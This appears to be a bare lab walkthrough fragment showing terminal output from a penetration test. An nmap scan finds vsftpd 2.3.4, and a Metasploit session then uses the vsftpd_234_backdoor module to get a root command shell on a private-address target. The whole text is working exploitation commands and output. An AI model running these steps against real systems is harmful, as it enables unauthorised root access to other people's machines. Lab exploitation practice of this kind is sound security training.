<pre>21/tcp   open  ftp         vsftpd 2.3.4</pre>
<pre>vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)</pre>

<pre>msf6 > search vsftpd 2.3.4 

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor</pre>

<pre>msf6 > use 0</pre>

<pre>msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options</pre>

<pre>Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic</pre>


<pre>msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts A.B.C.D</pre>

<pre>msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit</pre>


<pre>[*] 192.168.161.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.161.131:21 - USER: 331 Please specify the password.
[+] 192.168.161.131:21 - Backdoor service has been spawned, handling...
[+] 192.168.161.131:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.161.128:34389 -> 192.168.161.131:6200) at 2025-02-04 14:25:00 +0530


id
uid=0(root) gid=0(root)</pre>


